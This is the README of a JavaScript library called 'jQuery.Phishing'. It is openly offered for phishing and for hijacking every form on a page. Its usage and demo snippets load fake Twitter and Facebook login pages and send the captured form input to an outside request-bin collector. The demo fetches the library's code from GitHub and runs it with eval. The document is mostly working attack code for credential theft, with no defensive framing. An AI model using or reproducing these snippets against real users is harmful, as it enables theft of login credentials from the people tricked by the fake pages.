# jQuery.Phishing
## Usage
Phishing and Hijack All Form
```javascript
$.phishing('https://twitter.com/login','//your_request_bin')
```
### onload
```javascript
$.phishing('https://twitter.com/login',()=>alert`onload`)
```
## Demo
```javascript
$.get(`https://raw.githubusercontent.com/jackmasa/jQuery.Phishing/master/jQuery.Phishing.js`,c=>{
  eval(c);$.phishing(`//fb.com`,`http://requestbin.herokuapp.com/1koaluq1`);
});
```
result: [http://requestb.in/1koaluq1?inspect](http://requestb.in/1koaluq1?inspect)
